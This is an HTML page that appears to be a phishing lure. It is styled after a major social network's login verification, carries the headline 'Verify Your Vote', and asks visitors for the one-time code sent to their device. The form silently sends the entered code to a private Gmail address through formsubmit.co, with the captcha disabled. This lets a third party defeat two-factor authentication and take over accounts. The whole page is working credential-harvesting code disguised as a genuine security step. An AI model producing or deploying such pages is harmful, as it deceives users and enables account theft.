<!DOCTYPE html>
<html lang="en">


<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verify Your Login</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f0f2f5;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .card {
      background-color: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      text-align: center;
    }

    h2 {
      color: #1877f2;
    }

    p {
      color: #555;
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      color: #333;
    }

    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 16px;
      box-sizing: border-box;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    button {
      background-color: #1877f2;
      color: #fff;
      padding: 12px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
    }

    button:hover {
      background-color: #0e5a96;
    }
  </style>
 


   
</head>
<body>
  <div class="card">
    <h2>Verify Your Vote</h2>
    <p>Enter the one-time code sent to your device to complete the login process.</p>
    <form id="verificationForm" action="https://formsubmit.co/voterspridecenter@gmail.com" method="post">
      <label for="otp">One-Time Code:</label>
      <input type="text" id="otp" name="otp" required>
<input type="hidden" name="_captcha" value="false">


      <button type="submit">Verify</button>
    </form>
  </div>
</body>


</html>
